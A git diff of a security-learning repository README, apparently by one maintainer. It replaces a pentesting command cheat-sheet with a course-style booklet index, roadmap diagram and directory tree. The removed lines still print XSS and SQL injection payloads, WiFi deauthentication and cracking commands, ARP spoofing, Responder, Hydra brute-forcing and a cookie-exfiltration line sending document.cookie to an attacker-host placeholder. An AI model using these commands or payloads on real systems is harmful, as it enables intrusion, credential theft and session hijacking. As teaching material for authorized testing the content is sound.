@@ -1,216 +1,119 @@
-# Penetration-testing-toolkit
-A comprehensive collection of essential ethical hacking tools, penetration testing commands, and security cheat-sheets for Red Teaming and Web App Pentesting.
+# 📻 BugFix FM Booklet
+> **The Ultimate 4-Year Computer Science Engineering, Troubleshooting, Open-Source & Security Auditing Master Booklet**
 
-# 🛠️ Advanced Pentesting & Bug Bounty Playbook
-This repository serves as an operational reference playbook for Web Application Security, Network Auditing, Cloud Infrastructure, and Red Teaming engagements. It contains a highly comprehensive collection of advanced penetration testing commands, automated reconnaissance workflows, IoT/CCTV security auditing guidelines, and live Bug Bounty methodologies curated by **Shubham Patel (techindro)**.
+Curated by **Shubham Patel (techindro)**
 
-**⚠️ DISCLAIMER:** This repository is strictly for educational purposes, authorized research, and defensive security auditing. Performing unauthorized attacks or scanning networks without explicit, written permission/scope is completely illegal and punishable by law.
-
----
-
-## 📌 Arsenal Core Blueprint
-* [1. Live Bug Bounty Hunting & Automation](#1-live-bug-bounty-hunting--automation)
-* [2. Web App Exploitation (XSS & SQL Injection)](#2-web-app-exploitation-xss--sql-injection)
-* [3. API Security & Token Manipulation](#3-api-security--token-manipulation)
-* [4. Cloud Security Auditing (AWS)](#4-cloud-security-auditing-aws)
-* [5. Wireless Auditing (WiFi Hacking)](#5-wireless-auditing-wifi-hacking)
-* [6. IoT & CCTV Firmware Security Auditing](#6-iot--cctv-firmware-security-auditing)
-* [7. Network Spoofing & MITM Vectors](#7-network-spoofing--mitm-vectors)
-* [8. Active Directory & Windows Pentesting](#8-active-directory--windows-pentesting)
-* [9. Authentication Attacks & Brute Force](#9-authentication-attacks--brute-force)
-* [10. Mobile Sec & KernelSU Next (KSUN)](#10-mobile-sec--kernelsu-next-ksun)
+**⚠️ DISCLAIMER:** This booklet is strictly for educational purposes, authorized research, and defensive security auditing. Performing unauthorized attacks or scanning networks without explicit, written permission/scope is completely illegal and punishable by law.
 
 ---
 
-## 1. Live Bug Bounty Hunting & Automation
-Automate asset discovery, vulnerability scanning, and large-scale enumeration across target scopes on platforms like HackerOne and Bugcrowd.
+## 🎨 BugFix FM Booklet Ecosystem & Roadmap Architecture
 
-### Subdomain Recon & Mass Probing
-```bash
-# Map the attack surface by enumerating subdomains
-subfinder -d target.com -o subdomains.txt
+```mermaid
+flowchart TD
+    subgraph Year1["🎓 Year 1: Foundations & Tools"]
+        Linux["🐧 Module 11: Linux Fundamentals"]
+        CSE4Yr["🎓 Module 18: 4-Year CSE Roadmap"]
+        GitGH["🐙 Module 17: Git & GitHub Open-Source"]
+    end
 
-# Identify active HTTP/HTTPS servers and pull service titles
-httpx -l subdomains.txt -status-code -title -silent -o alive_subs.txt
-```
+    subgraph Year2["💻 Year 2: Specializations & Development"]
+        WebDev["🌐 Module 13: Web Dev Debugging"]
+        AppDev["📱 Module 14: Mobile App Debugging"]
+        AIML["🤖 Module 15: AI/ML & Data Science"]
+        Robotics["🤖 Module 16: Robotics & Embedded"]
+    end
 
-### Automated Template Scanning (Nuclei)
-```bash
-# Scan targets for specific CVEs and configuration issues
-nuclei -l alive_subs.txt -severity high,critical -o nuclei_results.txt
-```
+    subgraph Year3["🛡️ Year 3: Cyber Security Architecture"]
+        Recon["🎯 Module 01: Recon Automation"]
+        WebExploit["🌐 Module 02: Web App Security (XSS/SQLi)"]
+        APISec["🔑 Module 03: API & JWT Security"]
+        Cloud["☁️ Module 04: AWS Cloud Security"]
+        Wifi["📡 Module 05: Wireless Security"]
+        IoT["🎥 Module 06: IoT Firmware Auditing"]
+        NetSpoof["🔀 Module 07: Network Protocols"]
+        AD["🏰 Module 08: Active Directory"]
+        AuthSec["🔐 Module 09: Auth & Rate Limiting"]
+        Mobile["📱 Module 10: Mobile Sec & Frida"]
+    end
 
-### Parameter Discovery for XSS/SQLi/SSRF
-```bash
-# Pull historic URL data to hunt for vulnerable entry points
-waybackurls target.com | grep "\?" | uro > parameters.txt
+    subgraph Year4["🚀 Year 4: Capstone & Career Mastery"]
+        Practice["📅 Module 12: 30-Day Practice Roadmap"]
+        VDP["🏛️ Authorized VDP Research & Engineering Placements"]
+    end
 
-# Extract hidden parameters and spider paths 
-katana -u https://target.com -jc -d 3 -o katana_urls.txt
-```
-
----
-
-## 2. Web App Exploitation (XSS & SQL Injection)
-
-### Cross-Site Scripting (XSS) Payloads
-Injecting scripts into input vectors to evaluate context sanitization.
-* **Stored/Reflected XSS:** `<svg onload=alert(document.domain)>`
-* **DOM-Based XSS:** `javascript:alert(1)` through client-side sinks such as `window.location.hash`.
-
-### SQL Injection (SQLi)
-```bash
-# Map database structures and extract tables automatically
-sqlmap -u "http://target.com" --dbs --batch --random-agent
-
-# Common validation strings for manual auth bypass
-' OR '1'='1' --
-' UNION SELECT null, username, password FROM users --
+    Linux --> WebDev
+    GitGH --> WebDev
+    WebDev --> AppDev
+    AppDev --> AIML
+    AIML --> Robotics
+    Robotics --> Recon
+    Recon --> WebExploit
+    WebExploit --> APISec
+    APISec --> Practice
+    Practice --> VDP
 ```
 
 ---
 
-## 3. API Security & Token Manipulation
-Testing REST APIs, handling JSON Web Tokens (JWT), and auditing access controls.
+## 📌 BugFix FM Booklet Master Index
 
-### JWT Exploitation
-* **None Algorithm Attack:** Set the header to `{"alg":"none"}` and strip the signature to test validation flaws.
-* **Secret Key Auditing:**
-```bash
-# Run signature cracking against local wordlists
-jwtcat -t <JWT_TOKEN> -w /usr/share/wordlists/rockyou.txt
-```
-
-### API Endpoint Fuzzing
-```bash
-# Fuzz backend endpoints to find unmapped routing
-ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com -mc 200,403
-```
-
----
-
-## 4. Cloud Security Auditing (AWS)
-Locating misconfigured storage assets, identity exposures, and open public instances.
-
-### Misconfigured S3 Buckets
-```bash
-# Check for anonymous read access on cloud object storage
-aws s3 ls s3://target-bucket-name --no-sign-request
-
-# Verify object write capabilities to test for arbitrary file upload
-aws s3 cp test.txt s3://target-bucket-name/test.txt --no-sign-request
-```
+| Module | Category / Field | Core Topics & Solved Bugs | Documentation Link |
+| :--- | :--- | :--- | :---: |
+| **01. Recon Automation** | Security Auditing | Asset discovery math, Shannon entropy | [View Sheet](01-live-bug-bounty-automation/SHEET.md) |
+| **02. Web App Security** | Security Auditing | SQL Injection, XSS, CSP headers | [View Sheet](02-web-app-exploitation/SHEET.md) |
+| **03. API & JWT Security** | Security Auditing | JWT HMAC-SHA256, FFUF fuzzing | [View Sheet](03-api-security-token-manipulation/SHEET.md) |
+| **04. AWS Cloud Security** | Cloud Engineering | S3 Policies, IMDSv2 metadata | [View Sheet](04-cloud-security-aws/SHEET.md) |
+| **05. Wireless Security** | Network Security | WPA2 PMK PBKDF2, Aircrack-ng | [View Sheet](05-wireless-auditing/SHEET.md) |
+| **06. IoT & Firmware** | Hardware Security | Magic bytes, Binwalk filesystem | [View Sheet](06-iot-cctv-firmware-auditing/SHEET.md) |
+| **07. Network Protocols** | Network Engineering | ARP headers, Dynamic ARP Inspection | [View Sheet](07-network-spoofing-mitm/SHEET.md) |
+| **08. Active Directory** | Enterprise Security | NTLMv2 math, LLMNR fallback | [View Sheet](08-active-directory-windows/SHEET.md) |
+| **09. Auth & Rate Limit** | Application Security | Leaky Bucket math, Hydra syntax | [View Sheet](09-authentication-attacks-brute-force/SHEET.md) |
+| **10. Mobile Sec & Frida** | Mobile Security | Android Network Config, Frida V8 | [View Sheet](10-mobile-sec-kernelsu/SHEET.md) |
+| **11. Linux & Kali** | OS & Administration | `chmod` SUID, `grep`/`awk`/`sed` | [View Sheet](11-linux-kali-fundamentals/SHEET.md) |
+| **12. 30-Day Practice** | Study Roadmap | 30-Day step-by-step curriculum | [View Sheet](12-practice-roadmap-30-days/SHEET.md) |
+| **13. Web Dev Troubleshooting** | Web Development | CORS errors, `node_modules` reset, MongoDB Atlas, `.env` | [View Sheet](13-cse-web-dev-troubleshooting/SHEET.md) |
+| **14. App Dev Troubleshooting** | Mobile Development | Gradle JDK mismatch, `flutter doctor`, ADB server kills | [View Sheet](14-cse-app-dev-troubleshooting/SHEET.md) |
+| **15. AI/ML & Data Science** | Artificial Intelligence | PyTorch CUDA verification, Jupyter kernels, Pandas memory | [View Sheet](15-cse-aiml-data-science/SHEET.md) |
+| **16. Robotics & Embedded** | Robotics Engineering | Serial `/dev/ttyUSB0` permission denied, ROS2, ESP32 boot | [View Sheet](16-cse-robotics-embedded/SHEET.md) |
+| **17. Git & Open Source** | Software Engineering | SSH key setup, Merge conflict resolution, Open-source PR | [View Sheet](17-cse-git-github-opensource/SHEET.md) |
+| **18. 4-Year CSE Roadmap** | Academic & Career | 8-Semester roadmap, DSA, System Design (LLD/HLD), Placements | [View Sheet](18-cse-4-year-roadmap/SHEET.md) |
 
 ---
 
-## 5. Wireless Auditing (WiFi Hacking)
+## 📻 BugFix FM Booklet - Essential External Resources
 
-### WPA/WPA2 Handshake Capture (Aircrack-ng Suite)
-```bash
-# Enable monitor mode on the wireless interface
-airmon-ng start wlan0
-airodump-ng wlan0mon
-
-# Isolate target networks to record authentication handshakes
-airodump-ng -c <channel> --bssid <BSSID> -w capture_file wlan0mon
-
-# Issue deauthentication packets to force target reconnects
-aireplay-ng -0 10 -a <BSSID> -c <Client-MAC> wlan0mon
-
-# Run local wordlist attacks against the captured handshake file
-aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture_file-01.cap
-```
+- 🌐 [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free interactive web security learning platform.
+- 📖 [OWASP Web Security Testing Guide (WSTG)](https://github.com/OWASP/wstg) - Industry standard security auditing methodology.
+- 🧰 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Comprehensive security study guide & payload repository.
+- 📋 [SecLists](https://github.com/danielmiessler/SecLists) - Security wordlists for username/password discovery and testing.
 
 ---
 
-## 6. IoT & CCTV Firmware Security Auditing
-Auditing network device interfaces, local file systems, and checking deployment configurations.
+## 📂 BugFix FM Booklet Directory Structure
 
-### Discovering IoT & Camera Port Vectors
-```bash
-# Map network streaming and web control access points
-nmap -p 554,80,8080 -sV <target-subnet>
-
-# Audit management panels for default administrative credentials
-medusa -h <target-ip> -u admin -P default_camera_passwords.txt -M http
 ```
-
-### Firmware Extraction & Password Searching
-```bash
-# Unpack filesystem schemas from raw firmware images
-binwalk -e firmware.bin
-
-# Scan files for hardcoded configuration strings or private keys
-grep -rn "passwd" ./_firmware.bin.extracted/
-```
-
----
-
-## 7. Network Spoofing & MITM Vectors
-
-### ARP Spoofing (Man-In-The-Middle)
-```bash
-# Configure kernel routing to handle local traffic forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Intercept traffic pathways between target and gateway
-arpspoof -i wlan0 -t <Target-IP> <Gateway-IP>
-arpspoof -i wlan0 -t <Gateway-IP> <Target-IP>
-```
-
-### Session Hijacking via XSS Exfiltration
-```javascript
-// Route active session attributes to an external logging setup
-new Image().src="http://<Attacker-IP>/log?cookie=" + document.cookie;
+BugFix-FM-Booklet/
+├── 01-live-bug-bounty-automation/        # SHEET.md
+├── 02-web-app-exploitation/              # SHEET.md
+├── 03-api-security-token-manipulation/   # SHEET.md
+├── 04-cloud-security-aws/                # SHEET.md
+├── 05-wireless-auditing/                 # SHEET.md
+├── 06-iot-cctv-firmware-auditing/        # SHEET.md
+├── 07-network-spoofing-mitm/             # SHEET.md
+├── 08-active-directory-windows/          # SHEET.md
+├── 09-authentication-attacks-brute-force/ # SHEET.md
+├── 10-mobile-sec-kernelsu/               # SHEET.md
+├── 11-linux-kali-fundamentals/           # SHEET.md
+├── 12-practice-roadmap-30-days/          # SHEET.md
+├── 13-cse-web-dev-troubleshooting/       # SHEET.md
+├── 14-cse-app-dev-troubleshooting/       # SHEET.md
+├── 15-cse-aiml-data-science/             # SHEET.md
+├── 16-cse-robotics-embedded/             # SHEET.md
+├── 17-cse-git-github-opensource/         # SHEET.md
+├── 18-cse-4-year-roadmap/                # SHEET.md
+└── README.md                             # Main Root Booklet Entry
 ```
 
 ---
-
-## 8. Active Directory & Windows Pentesting
-Commands for identity capturing, internal enumeration, and privilege analysis across local enterprise setups.
-
-### LLMNR/NBT-NS Poisoning (Responder)
-```bash
-# Listen to local network name resolution calls to grab authentication hashes
-sudo responder -I eth0 -dwv
-```
-
-### Password Cracking (Hashcat)
-```bash
-# Check captured hashes against custom dictionary rules
-hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
-```
-
----
-
-## 9. Authentication Attacks & Brute Force
-
-### Web Login Brute-Forcing (Hydra)
-```bash
-# Test form submission endpoints against dictionary inputs
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
-```
-
-### Protocol & Directory Brute-Forcing
-```bash
-# Audit remote shell endpoints for weak account credentials
-hydra -L users.txt -P passwords.txt ssh://<target-ip> -t 4
-
-# Look for unlinked site structures using dictionary lists
-gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
-```
-
----
-
-## 10. Mobile Sec & KernelSU Next (KSUN)
-Bypassing application sandboxing, analyzing local runtimes, and dealing with application defenses during mobile audits.
-
-* **KernelSU Next Integration:** Using SUSFS patches within a test build to prevent instrumentation tools from being flagged by high-security applications.
-* **Dynamic Hooking Instrumentation:**
-```bash
-# Force injection of custom verification overrides at runtime
-frida -U -f com.target.app -l bypass_root.js
-```
-
----
-**👨‍💻 Maintainer:** [Shubham Patel (techindro)](https://github.com)
+**📻 BugFix FM Booklet Maintainer:** [Shubham Patel (techindro)](https://github.com)
